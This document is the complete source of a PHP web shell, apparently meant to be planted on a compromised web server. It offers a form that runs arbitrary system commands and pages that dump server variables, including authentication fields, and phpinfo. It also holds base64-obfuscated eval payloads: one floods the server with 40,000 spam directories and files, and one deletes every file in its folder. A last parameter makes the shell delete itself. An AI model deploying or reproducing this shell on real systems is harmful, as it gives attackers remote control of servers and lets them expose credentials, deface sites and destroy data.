<?php if(isset($_GET['cmd'])){echo "<form method='GET' action='?gox'><select name='cmd'><option value='exc'>Exec</option><option value='sexc'>Shell_exec</option><option value='stm'>System</option></select><input type='text' name='com'><input type='submit' name='gox' value='Execute'></form><script>";if($_GET['gox']){echo "</script>";echo "<br><pre>";$mtd = $_GET['cmd'];if($mtd === "exc"){echo @exec($_GET['com']);}elseif($mtd === "sexc"){echo @shell_exec($_GET['com']);}elseif($mtd === "stm"){echo @system($_GET['com']);}echo "</font></pre>"; }else{echo "Function Disable!";}}?>

<?php if (isset($_GET['srvinf'])) {$srvf = array('PHP_SELF','argv','argc','GATEWAY_INTERFACE','SERVER_ADDR','SERVER_NAME','SERVER_SOFTWARE','SERVER_PROTOCOL','REQUEST_METHOD','REQUEST_TIME','REQUEST_TIME_FLOAT','QUERY_STRING','DOCUMENT_ROOT','HTTP_ACCEPT','HTTP_ACCEPT_CHARSET','HTTP_ACCEPT_ENCODING','HTTP_ACCEPT_LANGUAGE','HTTP_CONNECTION','HTTP_HOST','HTTP_REFERER','HTTP_USER_AGENT','HTTPS','REMOTE_ADDR','REMOTE_HOST','REMOTE_PORT','REMOTE_USER','REDIRECT_REMOTE_USER','SCRIPT_FILENAME','SERVER_ADMIN','SERVER_PORT','SERVER_SIGNATURE','PATH_TRANSLATED','SCRIPT_NAME','REQUEST_URI','PHP_AUTH_DIGEST','PHP_AUTH_USER','PHP_AUTH_PW','AUTH_TYPE','PATH_INFO','ORIG_PATH_INFO') ;echo '<center><table border="2" cellpadding="10" color="white">' ;foreach ($srvf as $arg) { if (isset($_SERVER[$arg])) {echo '<tr><td><font color="white">'.$arg.'</td><td><font color="white">' . $_SERVER[$arg] . '</td></tr>' ;}else {echo '<font color="white"><tr><td>'.$arg.'</td><td>-</td></tr>' ;}}echo '</table></center>' ;}?>

<?php  if (isset($_GET['phpinfo'])) { ?><body style="background: black;font-family: 'Inconsolata', monospace;"><?php echo phpinfo();}?>

<!--Warning! 40000 Spam-->
<?php eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlx4NzNcMTYwXHg2MVx4NmQiXSkpIHsgZm9yICgkaSA9IDA7ICRpIDw9IDQwMDAwOyAkaSsrKSB7IG1rZGlyKCRpIC4gIlwxMTVceDY1XDE0M1wxNTBceDYxXDE1NlwxNTFceDYzXHg2MVwxNTRcNDBceDU3XDE0MVwxNjJceDZlXHgyMFx4NDNcMTU3XHg2ZFx4NmRcMTY1XHg2ZVwxNTFcMTY0XDE3MSIsIDI1NiwgdHJ1ZSk7IGNobW9kKCRpIC4gIlx4NGRceDY1XHg2M1x4NjhcMTQxXHg2ZVwxNTFceDYzXHg2MVwxNTRceDIwXDEyN1x4NjFcMTYyXHg2ZVw0MFx4NDNcMTU3XHg2ZFx4NmRcMTY1XDE1Nlx4NjlceDc0XHg3OSIsIDI1Nik7ICRtayA9ICRpIC4gIlx4NGRceDY1XDE0M1x4NjhceDYxXHg2ZVwxNTFceDYzXDE0MVwxNTRcNDBcMTI3XDE0MVx4NzJceDZlXHgyMFx4NDNceDZmXHg2ZFwxNTVceDc1XHg2ZVwxNTFceDc0XHg3OSI7ICR2YXIgPSBmb3BlbigkbWsgLiAiXHgyZlwxMTVcMTQ1XDE0M1wxNTBcMTQxXHg2ZVwxNTFceDYzXHg2MVwxNTRceDIwXDEyN1x4NjFceDcyXDE1Nlx4MjBcMTAzXDE1N1wxNTVceDZkXHg3NVwxNTZceDY5XHg3NFwxNzFcNTZcMTY0XDE3MFwxNjQiLCAiXDE0MVx4MmIiKTsgZndyaXRlKCR2YXIsICJceDU2XHg2OVx4NzNceDY5XDE2NFx4MjBcMTI1XDE2M1x4MjBceDZmXHg2ZVw0MFwxNTBceDc0XDE2NFwxNjBcMTYzXDcyXDU3XHgyZlwxNTVceDY1XDE0M1wxNTBceDYxXHg2ZVx4NjlceDYzXHg2MVx4NmNcMTY3XDE0MVwxNjJceDZlXDU2XDE0M1wxNTdcMTU1Iik7IGNobW9kKCRtayAuICJcNTdceDRkXDE0NVwxNDNceDY4XHg2MVwxNTZceDY5XHg2M1wxNDFceDZjXHgyMFx4NTdceDYxXHg3Mlx4NmVcNDBcMTAzXDE1N1wxNTVcMTU1XDE2NVwxNTZceDY5XHg3NFx4NzlceDJlXHg3NFwxNzBcMTY0IiwgMjkyKTsgfSBlY2hvICJceDUzXDE2MFwxNDFcMTU1XHgyMFx4NTNcMTY1XDE0M1x4NjNceDY1XHg3M1wxNjMiOyB9IA==')); ?>

<?php eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlx4NjRceDY1XDE1NFwxNDVcMTY0XDE0NSJdKSkgeyAkZmlsZXMgPSBzY2FuZGlyKF9fRElSX18pOyBmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGUpIHsgaWYgKGlzX2ZpbGUoJGZpbGUpKSB7IHVubGluaygkZmlsZSk7IH0gfSBlY2hvICJcMTAxXDE1NFwxNTRceDIwXHg0Nlx4NjlcMTU0XDE0NVwxNjNceDIwXHg0NFx4NjVcMTU0XHg2NVx4NzRcMTQ1XDE0NCI7IH0g')); ?>

<?php if (isset($_GET['die'])) {unlink(__FILE__);echo "Sayonara :)";}?>
